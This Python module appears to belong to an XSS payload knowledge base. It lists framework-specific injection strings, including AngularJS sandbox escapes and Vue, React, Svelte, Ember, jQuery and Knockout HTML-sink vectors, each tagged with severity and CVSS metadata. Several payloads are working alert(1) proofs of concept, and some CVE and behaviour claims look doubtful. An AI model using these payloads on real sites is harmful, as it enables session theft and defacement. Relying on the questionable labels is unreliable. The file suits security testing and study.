#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Production
Telegram: https://t.me/EasyProTech

Framework Gadget Database
Vue, Angular, React, Svelte, Ember, Backbone
Specific template injection and binding vectors
"""

from ..models import PayloadEntry

FRAMEWORK_GADGETS_PAYLOADS = {
    # === AngularJS 1.x Sandbox Escapes ===
    "ng1_constructor_chain": PayloadEntry(
        payload="{{constructor.constructor('alert(1)')()}}",
        contexts=["angular", "template_injection"],
        severity="critical",
        cvss_score=9.5,
        description="AngularJS 1.x classic sandbox escape via constructor chain. Works on versions 1.0-1.5.",
        tags=["angular", "angularjs", "sandbox-escape", "constructor", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["angular 1.0-1.5"],
        spec_ref="CVE-2020-7676"
    ),
    "ng1_on_constructor": PayloadEntry(
        payload="{{$on.constructor('alert(1)')()}}",
        contexts=["angular", "template_injection"],
        severity="critical",
        cvss_score=9.5,
        description="AngularJS $on scope method constructor chain for sandbox escape",
        tags=["angular", "angularjs", "sandbox-escape", "$on", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["angular 1.x"]
    ),
    "ng1_number_literal": PayloadEntry(
        payload="{{(1).constructor.constructor('alert(1)')()}}",
        contexts=["angular", "template_injection"],
        severity="critical",
        cvss_score=9.5,
        description="AngularJS sandbox escape via Number literal prototype chain",
        tags=["angular", "angularjs", "sandbox-escape", "number", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["angular 1.x"]
    ),
    "ng1_charat_override": PayloadEntry(
        payload="{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
        contexts=["angular", "template_injection"],
        severity="critical",
        cvss_score=9.5,
        description="AngularJS sandbox escape via String.prototype.charAt override to Array.join",
        tags=["angular", "angularjs", "sandbox-escape", "prototype-override", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["angular 1.2-1.5"]
    ),
    "ng1_eval_breakout": PayloadEntry(
        payload="{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
        contexts=["angular", "template_injection"],
        severity="critical",
        cvss_score=9.5,
        description="AngularJS $eval parser breakout combined with charAt override",
        tags=["angular", "angularjs", "sandbox-escape", "$eval", "parser", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["angular 1.x"]
    ),
    "ng1_orderby_gadget": PayloadEntry(
        payload="{{orderBy:[].constructor.constructor('alert(1)')()}}",
        contexts=["angular", "template_injection"],
        severity="critical",
        cvss_score=9.5,
        description="AngularJS orderBy filter gadget for sandbox escape",
        tags=["angular", "angularjs", "sandbox-escape", "orderby", "filter", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["angular 1.x"]
    ),

    # === Angular 2+ ===
    "ng2_innerhtml_binding": PayloadEntry(
        payload='<div [innerHTML]="\'<img src=x onerror=alert(1)>\'"></div>',
        contexts=["angular", "html_content"],
        severity="high",
        cvss_score=7.5,
        description="Angular 2+ innerHTML binding. Bypasses sanitization if marked as trusted via DomSanitizer.",
        tags=["angular", "angular2+", "innerhtml", "binding", "gadget"],
        reliability="medium",
        browser_support=["all"],
        known_affected=["angular 2+"]
    ),
    "ng2_bypass_security": PayloadEntry(
        payload='<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userInput)"></div>',
        contexts=["angular", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Angular 2+ bypassSecurityTrustHtml() misuse pattern leading to XSS",
        tags=["angular", "angular2+", "bypass-security", "sanitizer", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "ng2_ngif_template": PayloadEntry(
        payload='<ng-template [ngIf]="true"><script>alert(1)</script></ng-template>',
        contexts=["angular", "html_content"],
        severity="high",
        cvss_score=7.5,
        description="Angular 2+ ng-template with ngIf for conditional script injection",
        tags=["angular", "angular2+", "ngif", "ng-template", "gadget"],
        reliability="medium",
        browser_support=["all"]
    ),

    # === Vue 2.x ===
    "vue2_constructor_chain": PayloadEntry(
        payload="{{constructor.constructor('alert(1)')()}}",
        contexts=["vue", "template_injection"],
        severity="critical",
        cvss_score=9.0,
        description="Vue 2.x template injection via constructor chain - classic sandbox escape",
        tags=["vue", "vue2", "constructor", "sandbox-escape", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["vue 2.x"]
    ),
    "vue2_vhtml_directive": PayloadEntry(
        payload='<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
        contexts=["vue", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Vue v-html directive renders unescaped HTML - XSS if user-controlled",
        tags=["vue", "vue2", "v-html", "directive", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "vue2_compile_gadget": PayloadEntry(
        payload="{{_c.constructor('alert(1)')()}}",
        contexts=["vue", "template_injection"],
        severity="critical",
        cvss_score=9.0,
        description="Vue 2.x _c (createElement) internal function constructor abuse",
        tags=["vue", "vue2", "_c", "internal", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["vue 2.x"]
    ),

    # === Vue 3.x ===
    "vue3_suspense_slot": PayloadEntry(
        payload='<suspense><template #default><img src=x onerror=alert(1)></template></suspense>',
        contexts=["vue", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Vue 3 Suspense component default slot injection for XSS",
        tags=["vue", "vue3", "suspense", "slot", "gadget"],
        reliability="medium",
        browser_support=["all"],
        known_affected=["vue 3.x"]
    ),
    "vue3_dynamic_component": PayloadEntry(
        payload='<component :is="\'script\'">alert(1)</component>',
        contexts=["vue", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Vue 3 dynamic component rendering script tag via :is binding",
        tags=["vue", "vue3", "dynamic-component", ":is", "gadget"],
        reliability="medium",
        browser_support=["all"]
    ),
    "vue3_teleport_xss": PayloadEntry(
        payload='<teleport to="body"><script>alert(1)</script></teleport>',
        contexts=["vue", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Vue 3 Teleport component moving XSS payload to body",
        tags=["vue", "vue3", "teleport", "gadget"],
        reliability="medium",
        browser_support=["all"]
    ),

    # === React ===
    "react_dangerously_set": PayloadEntry(
        payload='dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}',
        contexts=["react", "jsx"],
        severity="high",
        cvss_score=8.0,
        description="React dangerouslySetInnerHTML prop for raw HTML injection - XSS if user-controlled",
        tags=["react", "dangerouslysetinnerhtml", "jsx", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "react_href_javascript": PayloadEntry(
        payload='href={"javascript:alert(1)"}',
        contexts=["react", "jsx", "href"],
        severity="high",
        cvss_score=7.5,
        description="React href prop with javascript: protocol - bypasses some sanitization",
        tags=["react", "href", "javascript-protocol", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "react_ref_innerhtml": PayloadEntry(
        payload='ref={(e)=>{if(e)e.innerHTML="<img src=x onerror=alert(1)>"}}',
        contexts=["react", "jsx"],
        severity="high",
        cvss_score=8.0,
        description="React ref callback with innerHTML manipulation for XSS",
        tags=["react", "ref", "innerhtml", "callback", "gadget"],
        reliability="medium",
        browser_support=["all"]
    ),
    "react_ssr_hydration": PayloadEntry(
        payload='<div suppressHydrationWarning dangerouslySetInnerHTML={{__html: userInput}}></div>',
        contexts=["react", "jsx", "ssr"],
        severity="critical",
        cvss_score=9.0,
        description="React SSR hydration mismatch with suppressHydrationWarning hiding XSS",
        tags=["react", "ssr", "hydration", "suppress-warning", "gadget"],
        reliability="medium",
        browser_support=["all"]
    ),

    # === Svelte ===
    "svelte_html_directive": PayloadEntry(
        payload='{@html "<img src=x onerror=alert(1)>"}',
        contexts=["svelte", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Svelte @html directive renders unescaped HTML - XSS if user-controlled",
        tags=["svelte", "@html", "directive", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "svelte_action_xss": PayloadEntry(
        payload='<div use:action={{html: "<script>alert(1)</script>"}}>',
        contexts=["svelte", "html_content"],
        severity="high",
        cvss_score=7.5,
        description="Svelte action directive with HTML injection in parameters",
        tags=["svelte", "action", "use:", "gadget"],
        reliability="medium",
        browser_support=["all"]
    ),

    # === Ember.js ===
    "ember_triple_stache": PayloadEntry(
        payload='{{{userInput}}}',
        contexts=["ember", "template_injection"],
        severity="high",
        cvss_score=8.0,
        description="Ember.js triple-stache renders unescaped HTML - XSS if user-controlled",
        tags=["ember", "triple-stache", "unescaped", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "ember_htmlsafe": PayloadEntry(
        payload='{{html-safe userInput}}',
        contexts=["ember", "template_injection"],
        severity="high",
        cvss_score=8.0,
        description="Ember.js htmlSafe helper marks string as safe - XSS if user-controlled",
        tags=["ember", "htmlsafe", "helper", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),

    # === Backbone.js ===
    "backbone_underscore_template": PayloadEntry(
        payload='<%= userInput %>',
        contexts=["backbone", "underscore", "template_injection"],
        severity="high",
        cvss_score=8.0,
        description="Backbone/Underscore template interpolation executes JS - XSS if user-controlled",
        tags=["backbone", "underscore", "template", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "backbone_model_xss": PayloadEntry(
        payload='this.model.set("bio", "<img src=x onerror=alert(1)>")',
        contexts=["backbone", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Backbone Model.set() with XSS in attribute - stored XSS when rendered",
        tags=["backbone", "model", "set", "stored-xss", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),

    # === jQuery (Legacy) ===
    "jquery_html_method": PayloadEntry(
        payload='$(selector).html("<img src=x onerror=alert(1)>")',
        contexts=["jquery", "javascript"],
        severity="high",
        cvss_score=8.0,
        description="jQuery .html() method with user-controlled content - classic XSS sink",
        tags=["jquery", "html", "sink", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "jquery_append_xss": PayloadEntry(
        payload='$(selector).append(userInput)',
        contexts=["jquery", "javascript"],
        severity="high",
        cvss_score=8.0,
        description="jQuery .append() with user-controlled HTML - XSS sink",
        tags=["jquery", "append", "sink", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
    "jquery_selector_xss": PayloadEntry(
        payload='$("<img src=x onerror=alert(1)>")',
        contexts=["jquery", "javascript"],
        severity="high",
        cvss_score=8.0,
        description="jQuery selector with HTML string creates DOM elements - XSS if user-controlled",
        tags=["jquery", "selector", "dom-creation", "gadget"],
        reliability="high",
        browser_support=["all"],
        known_affected=["jquery < 3.5.0"],
        spec_ref="CVE-2020-11022"
    ),

    # === Knockout.js ===
    "knockout_html_binding": PayloadEntry(
        payload='<div data-bind="html: userInput"></div>',
        contexts=["knockout", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Knockout.js html binding renders unescaped HTML - XSS if observable is user-controlled",
        tags=["knockout", "html-binding", "observable", "gadget"],
        reliability="high",
        browser_support=["all"]
    ),
}

FRAMEWORK_GADGETS_TOTAL = len(FRAMEWORK_GADGETS_PAYLOADS)
